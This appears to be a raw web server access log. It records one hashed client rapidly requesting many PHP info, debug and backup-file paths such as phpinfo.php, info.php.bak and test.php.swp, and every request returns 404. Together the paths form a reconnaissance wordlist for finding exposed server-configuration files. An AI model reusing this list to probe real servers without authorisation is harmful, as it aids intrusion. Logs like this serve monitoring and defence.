043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:24;;/phpinfo.php~;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:24;;/php_info.php.swp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:24;;/check.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:24;;/test.php.tmp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:24;;/phpinfo.php.tmp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:24;;/test/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:24;;/admin/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:24;;/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:24;;/admin/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:24;;/phpinfo.php.orig;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:24;;/test/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:24;;/test/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:24;;/dev/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:24;;/dev/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:24;;/dev/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:24;;/dev/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:24;;/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:24;;/test/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:24;;/i.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:24;;/pi.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:24;;/phpversion.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:24;;/php_version.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:24;;/debug.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:24;;/serverinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:24;;/diagnostic.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:24;;/server.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:25;;/test/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:25;;/admin/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:25;;/test/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:25;;/dev/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:25;;/test/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:25;;/test/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:25;;/includes/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:25;;/scripts/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:25;;/dev/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:25;;/phpinfo;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:25;;/tmp/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:25;;/includes/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:25;;/includes/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:25;;/web/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:25;;/scripts/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:25;;/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:25;;/includes/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:25;;/web/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:25;;/test.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:25;;/public/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:25;;/public/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:25;;/tmp/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:25;;/tmp/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:25;;/web/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:25;;/public/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:25;;/scripts/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:25;;/tmp/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:25;;/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:25;;/_profiler/phpinfo;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:25;;/scripts/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:25;;/public/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:25;;/php_info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:25;;/info1.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:25;;/test.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:25;;/php_info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:25;;/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:25;;/_profiler/phpinfo;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:25;;/phpinfo;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:26;;/info1.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:26;;/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:26;;/info2.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:26;;/php.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:26;;/pi.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:26;;/test.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:26;;/php_info.php.bak;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:26;;/info.php.bak;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:26;;/test.php.bak;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:26;;/phpinfo.php.bak;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:27;;/test.php.backup;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:27;;/admin/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:27;;/php_info.php.tmp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:27;;/info.php.old;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:27;;/info.php.orig;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:27;;/php_info.php.old;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:27;;/info.php.tmp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:27;;/dev/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:27;;/php_info.php.backup;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:27;;/test/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:27;;/phpinfo.php.orig;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:27;;/test.php~;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:27;;/test.php.tmp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:27;;/phpinfo.php.tmp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:27;;/php_info.php~;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:27;;/test.php.swp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:27;;/test.php.orig;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:27;;/phpinfo.php.old;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:27;;/info.php~;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:27;;/test/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:27;;/phpinfo.php.backup;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:27;;/php_info.php.orig;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:27;;/info.php.swp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:27;;/test/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:27;;/test/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:27;;/admin/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:27;;/admin/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:27;;/test.php.old;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:27;;/phpinfo.php~;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:27;;/admin/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:27;;/info.php.backup;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:27;;/test.php~;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:27;;/phpinfo.php.swp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:27;;/php_info.php.swp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:27;;/phpinfo.php.swp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:27;;/test.php.swp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:27;;/phpinfo.php.tmp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:27;;/info.php.swp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:27;;/php_info.php.swp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:27;;/phptest.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:27;;/phpversion.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:27;;/diagnostic.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:27;;/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:27;;/check.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:27;;/info2.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:27;;/pi.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:27;;/serverinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:27;;/diagnostic.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:27;;/i.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:27;;/debug.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:27;;/phpinfo;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:27;;/_profiler/phpinfo;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:27;;/serverinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:27;;/server.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:27;;/php_version.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:27;;/phptest.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:27;;/i.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:27;;/test.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:27;;/phpversion.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:27;;/diagnostic.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:27;;/phpversion.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:27;;/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:27;;/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:27;;/check.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:27;;/info1.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:27;;/server.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:27;;/php.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:27;;/debug.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:27;;/php_info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:27;;/server.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:27;;/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:27;;/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:27;;/php_info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:27;;/phptest.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:27;;/serverinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:27;;/php_version.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:27;;/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:27;;/php_version.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:27;;/pi.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:27;;/debug.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:27;;/info.php.bak;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:27;;/phpinfo.php.old;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:27;;/test.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:27;;/php_info.php.bak;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:27;;/php.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:27;;/phpinfo.php.bak;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:27;;/test.php.bak;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:27;;/diagnostic.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:27;;/check.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:27;;/php_info.php.orig;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:27;;/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:27;;/info.php.old;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:27;;/test.php.old;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:27;;/php_info.php.old;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:27;;/phpinfo.php.orig;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:27;;/info.php.orig;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:27;;/php_info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:27;;/phpinfo.php.backup;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:27;;/info.php.backup;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:27;;/info.php~;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:27;;/test.php.backup;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:27;;/php_info.php~;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:27;;/test.php.backup;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:27;;/php_info.php.backup;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:27;;/phpinfo.php~;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:27;;/phpinfo.php.backup;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:27;;/test.php.orig;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:27;;/test.php~;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:27;;/test/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:27;;/phptest.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:27;;/phpinfo.php.tmp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:27;;/php_info.php.swp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:27;;/phpinfo.php~;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:27;;/check.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:27;;/php_info.php~;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:27;;/info.php.backup;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:27;;/info.php.tmp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:27;;/phpinfo.php.swp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:27;;/php_info.php.tmp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:27;;/phpinfo.php.swp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:27;;/info.php.swp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:27;;/test.php.swp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:27;;/test.php.tmp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:27;;/test.php.orig;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:28;;/admin/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:28;;/admin/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:28;;/admin/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:28;;/php_info.php.backup;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:28;;/admin/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:28;;/test/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:28;;/test/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:28;;/test.php~;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:28;;/phpinfo.php.tmp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:28;;/admin/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:28;;/dev/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:28;;/info.php~;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:28;;/test.php.swp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:28;;/php_info.php.tmp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:28;;/test.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:28;;/test/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:28;;/admin/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:28;;/info.php.tmp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:28;;/admin/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:28;;/test/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:28;;/php_info.php.bak;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:28;;/dev/info.php;GET;404
